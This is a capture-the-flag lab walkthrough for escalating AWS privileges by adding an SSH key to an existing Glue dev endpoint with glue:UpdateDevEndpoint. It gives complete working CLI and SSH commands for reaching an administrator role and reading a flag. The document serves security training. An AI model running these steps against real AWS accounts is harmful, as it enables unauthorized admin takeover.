# Guided Walkthrough: One-Hop Privilege Escalation: glue:UpdateDevEndpoint

This scenario demonstrates a privilege escalation vulnerability where a user with `glue:UpdateDevEndpoint` permission can add their SSH public key to a pre-existing AWS Glue development endpoint. Once the SSH key is added, the attacker can SSH into the endpoint and execute AWS CLI commands with the full permissions of the IAM role attached to the endpoint. Unlike `glue:CreateDevEndpoint` (which requires `iam:PassRole`), updating an existing endpoint allows an attacker to gain access to an already-privileged role without needing role attachment permissions.

This scenario is particularly dangerous in environments where development endpoints are created with administrative or highly privileged roles for data engineering work, multiple teams share access to Glue resources without strict RBAC, and endpoints are left running for extended periods with powerful IAM roles attached.

**IMPORTANT COST WARNING**: AWS Glue development endpoints cost approximately **$2.20/hour** and run continuously while the scenario is deployed. Always destroy the scenario when finished testing.

## The Challenge

You start as `pl-prod-glue-002-to-admin-starting-user`, an IAM user with `glue:UpdateDevEndpoint` (and the helpful permissions `glue:GetDevEndpoint` and `glue:GetDevEndpoints`). You have no administrative access — attempting `aws iam list-users` will fail immediately.

Somewhere in this AWS account, a Glue development endpoint named `pl-prod-glue-002-to-admin-endpoint` is already running. That endpoint was provisioned with `pl-prod-glue-002-to-admin-target-role` attached — a role that carries `AdministratorAccess`. Your goal is to reach that role and prove you have admin access.

## Reconnaissance

First, verify your identity and confirm what you cannot do yet:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-glue-002-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied
```

Good — you are the starting user and you definitely do not have admin permissions. Now look for existing Glue dev endpoints. This is where `glue:GetDevEndpoints` is useful:

```bash
aws glue get-dev-endpoints --query 'DevEndpoints[*].[EndpointName,Status,RoleArn]' --output table
```

You'll find `pl-prod-glue-002-to-admin-endpoint` in READY status with `pl-prod-glue-002-to-admin-target-role` attached. That role name signals elevated permissions. To confirm the endpoint's address (needed for SSH later):

```bash
aws glue get-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-admin-endpoint \
  --query 'DevEndpoint.[EndpointName,Status,RoleArn,PublicAddress]' \
  --output text
```

At this point you have everything you need: an endpoint in READY state, running with a privileged role, and accepting SSH public keys via `UpdateDevEndpoint`.

## Exploitation

### Step 1: Generate an SSH key pair

You need a key pair you control. Generate one locally — no passphrase, so the private key can be used non-interactively:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/glue_attack_key -N ""
```

This produces `/tmp/glue_attack_key` (private) and `/tmp/glue_attack_key.pub` (public).

### Step 2: Inject the SSH public key into the endpoint

This is the exploitation step. `glue:UpdateDevEndpoint` accepts an `--add-public-keys` parameter that appends your public key to the endpoint's authorized keys:

```bash
aws glue update-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-admin-endpoint \
  --add-public-keys "$(cat /tmp/glue_attack_key.pub)"
```

The call returns immediately with no output on success. The endpoint transitions to UPDATING status — you need to wait for it to return to READY before SSH will work. Poll every 30 seconds:

```bash
aws glue get-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-admin-endpoint \
  --query 'DevEndpoint.Status' --output text
```

Key propagation typically takes 15–60 seconds. Once the status is back to READY, the endpoint accepts your key.

### Step 3: Retrieve the SSH address

```bash
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-admin-endpoint \
  --query 'DevEndpoint.PublicAddress' --output text)
echo "$ENDPOINT_ADDRESS"
```

### Step 4: SSH in and run privileged commands

The Glue dev endpoint runs as the `glue` user (or `livy`, depending on the endpoint version). The EC2 instance backing the endpoint inherits credentials from the attached IAM role via the Instance Metadata Service:

```bash
ssh -i /tmp/glue_attack_key \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "glue@${ENDPOINT_ADDRESS}" \
  "aws iam list-users --max-items 3 --output table"
```

## Verification

From inside the SSH session, confirm which identity is running:

```bash
ssh -i /tmp/glue_attack_key "glue@${ENDPOINT_ADDRESS}" "aws sts get-caller-identity"
```

The `Arn` field will contain `pl-prod-glue-002-to-admin-target-role`, confirming you are executing as the administrative role. Successful execution of `aws iam list-users` proves `AdministratorAccess` is in effect.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` attached to the Glue dev endpoint's IAM role provides.

Because the admin credentials come from the endpoint's Instance Metadata Service — not your local environment — you retrieve the flag from **within the SSH session**:

```bash
ssh -i /tmp/glue_attack_key \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "glue@${ENDPOINT_ADDRESS}" \
  "aws ssm get-parameter --name /pathfinding-labs/flags/glue-002-to-admin --query 'Parameter.Value' --output text"
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism is identical across every `to-admin` scenario — only the scenario ID in the path changes.

## What Happened

You exploited the fact that `glue:UpdateDevEndpoint` lets any holder of that permission inject SSH keys into any Glue dev endpoint (subject only to IAM resource restrictions — which in this scenario had none). The endpoint's EC2 backing instance automatically provides credentials for the attached IAM role via IMDS, so once you have SSH access, every AWS CLI call runs as that role.

This is meaningfully different from `glue:CreateDevEndpoint` (covered in glue-001): creating an endpoint requires `iam:PassRole` to attach a role, which is a well-known dangerous permission. Updating an existing endpoint sidesteps that check entirely — the role is already attached, and you just need the ability to push an SSH key. In real environments, data engineers routinely hold `glue:UpdateDevEndpoint` to manage their own endpoints, never realizing it doubles as a privilege escalation vector against every other endpoint in the account.
